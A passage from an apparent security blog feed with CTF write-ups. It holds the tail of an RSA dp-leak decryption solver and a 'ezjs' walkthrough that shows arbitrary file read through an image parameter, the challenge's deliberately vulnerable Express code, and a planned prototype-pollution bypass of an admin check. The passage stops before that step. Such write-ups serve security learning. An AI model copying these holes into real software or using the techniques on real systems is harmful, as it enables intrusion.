punctuation">:</span>    _ <span class="token operator">=</span> dp <span class="token operator">*</span> e <span class="token operator">-</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> _ <span class="token operator">%</span> i<span class="token punctuation">:</span>            p <span class="token operator">=</span> _ <span class="token operator">//</span> i <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> n <span class="token operator">%</span> p<span class="token punctuation">:</span>                q <span class="token operator">=</span> n <span class="token operator">//</span> p                phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>                d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> dn<span class="token operator">=</span><span class="token number">81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391</span>ct<span class="token operator">=</span><span class="token number">61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151</span>e <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> decrypt<span class="token punctuation">(</span>e<span class="token punctuation">,</span> dp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><img src="/article/2021xyb/1.png" class="" width="1" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一下，祥云杯的wp&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>2021巅峰极客一道题——ezjs</title>
    <link href="https://err0r.top/article/2021dfjk/"/>
    <id>https://err0r.top/article/2021dfjk/</id>
    <published>2021-08-03T05:59:30.000Z</published>
    <updated>2021-08-03T08:19:42.136Z</updated>
    
    <content type="html"><![CDATA[<p>深入学习一下JavaScript的原型链污染漏洞</p><a id="more"></a><p>我是巅峰fw，就摸出来一道题目，好好学习下原型链污染。以下为做题视角。</p><h2 id="Web-ezjs"><a href="#Web-ezjs" class="headerlink" title="Web-ezjs"></a>Web-ezjs</h2><h3 id="第一步-任意文件读取"><a href="#第一步-任意文件读取" class="headerlink" title="第一步 - 任意文件读取"></a>第一步 - 任意文件读取</h3><p>打开题目发现非常简洁的登陆，以为是sql注入，随便输入以下发现直接进入了。</p><p>登陆限制username和password大于5位</p><img src="/article/2021dfjk/image-20210803151950579.png" class="" title="image-20210803151950579" loading="lazy"><p>图片显示这块明显有异常，对应GET请求的newing参数</p><img src="/article/2021dfjk/image-20210803142727224.png" class="" title="image-20210803142727224" loading="lazy"><h4 id="存在任意文件读取"><a href="#存在任意文件读取" class="headerlink" title="存在任意文件读取"></a>存在任意文件读取</h4><img src="/article/2021dfjk/image-20210803142841282.png" class="" title="image-20210803142841282" loading="lazy"><p>利用此处读取了部分源码如下</p><p><code>/app/routes/index.js</code></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token punctuation">&#123;</span>body<span class="token punctuation">,</span> validationResult<span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-validator'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> validator <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"username is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">if</span><span class="token punctuation">(</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isLength</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>min<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">withMessage</span><span class="token punctuation">(</span><span class="token string">"password is too short"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> errors <span class="token operator">=</span> <span class="token function">validationResult</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>errors<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> errors<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>msg<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>validator<span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">"登录界面"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">;</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'admin password error'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>msg<span class="token operator">:</span> <span class="token string">'plz input your username and password'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/verify'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'login first plz'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">=</span> <span class="token string">"notadmin"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'verify'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'verify success'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//req.session.debug = true;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>newimg<span class="token punctuation">;</span>    <span class="token keyword">var</span> imgdata <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>img<span class="token operator">:</span> <span class="token string">"./images/1.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> base64data <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>imgdata<span class="token punctuation">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> info <span class="token operator">=</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'我的空间'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username<span class="token punctuation">,</span> png<span class="token operator">:</span> <span class="token string">"data:image/png;base64,"</span> <span class="token operator">+</span> base64data<span class="token punctuation">,</span> diy<span class="token operator">:</span> <span class="token string">"十年磨一剑😅v0.0.0(尚处于开发版"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>isadmin <span class="token operator">!==</span> <span class="token string">"notadmin"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">&amp;&amp;</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>debug <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> info<span class="token punctuation">.</span>pretty <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>p<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>diy<span class="token punctuation">;</span>      info<span class="token punctuation">.</span>diy <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy <span class="token operator">?</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>diy<span class="token operator">:</span> <span class="token string">"尊贵的admin"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> info<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'msg'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>title<span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span> msg<span class="token operator">:</span> <span class="token string">'plz login first'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>/app/app.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> logger <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'morgan'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> <span class="token string">'session'</span><span class="token punctuation">;</span><span class="token keyword">var</span> indexRouter <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./routes/index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> secrets <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> key<span class="token punctuation">,</span>  secret<span class="token operator">:</span> secrets<span class="token punctuation">,</span>  store<span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">sessionStore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  saveUninitialized<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  resave<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  cookie<span class="token operator">:</span> <span class="token punctuation">&#123;</span>    maxAge<span class="token operator">:</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">600</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// view engine setup</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'pug'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">logger</span><span class="token punctuation">(</span><span class="token string">'dev'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> extended<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> indexRouter<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// catch 404 and forward to error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token function">createError</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// error handler</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// set locals, only providing error in development</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>message <span class="token operator">=</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span>  res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>error <span class="token operator">=</span> req<span class="token punctuation">.</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'env'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'development'</span> <span class="token operator">?</span> err <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token comment">// render the error page</span>  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>status <span class="token operator">||</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> app<span class="token punctuation">;</span></code></pre><p>本地安装一下环境</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"cookie-parser"</span><span class="token operator">:</span> <span class="token string">"^1.4.5"</span><span class="token punctuation">,</span>    <span class="token property">"crypto"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.1"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"express-validator"</span><span class="token operator">:</span> <span class="token string">"^6.12.1"</span><span class="token punctuation">,</span>    <span class="token property">"http-errors"</span><span class="token operator">:</span> <span class="token string">"^1.8.0"</span><span class="token punctuation">,</span>    <span class="token property">"morgan"</span><span class="token operator">:</span> <span class="token string">"^1.10.0"</span><span class="token punctuation">,</span>    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"^0.12.7"</span><span class="token punctuation">,</span>    <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"^2.88.2"</span><span class="token punctuation">,</span>    <span class="token property">"session-file-store"</span><span class="token operator">:</span> <span class="token string">"^1.5.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="第二步-代码审计"><a href="#第二步-代码审计" class="headerlink" title="第二步 - 代码审计"></a>第二步 - 代码审计</h3><p>根据源码可以发现，题目要求我们以admin身份登陆，但是admin的密码又是随机不可能破解的</p><img src="/article/2021dfjk/image-20210803143641462.png" class="" title="image-20210803143641462" loading="lazy"><p>跟到<code>/verify</code>路由，可以看到如果<code>session.username</code>是admin就将<code>isadmin</code>赋值admin，否则就是notadmin </p><img src="/article/2021dfjk/image-20210803143743000.png" class="" title="image-20210803143743000" loading="lazy"><p>再继续跟进到<code>/admin</code>路由 ，发现任意文件读取漏洞的源码。关键点在于下一步，如果<code>isadmin</code><strong>只要不是</strong>notadmin就会执行一段操作，所以我们的下一个目标就是令<code>isadmin</code>变为非notadmin</p><img src="/article/2021dfjk/image-20210803144118578.png" class="" title="image-20210803144118578" loading="lazy"><p>admin的密码每次都是随机的，所以出题人根本不想让我们登陆获得admin，也不可能登陆admin。所以得另想方法，我们的关键点就在于让<code>isadmin</code>不是notadmin，而<code>isadmin</code>又是在<code>/verify</code>路由下才创建的，如果改变原型对象的内容让<code>isadmin</code>提前创建，这样就达到了污染，从而让<code>isadmin</code>变为非notadmin</p><p>图为 <a href="www.mrkaixin.top">@Mrkaixin</a> 师傅给出的session样子</p><img src="/article/2021dfjk/image-20210803144614812.png" class="" title="image-20210803144614812" loading="lazy"><h3 id="第三步-原型链污染"><a href="#第三步-原型链污染" class="headerlink" title="第三步 - 原型链污染"></a>第三步 - 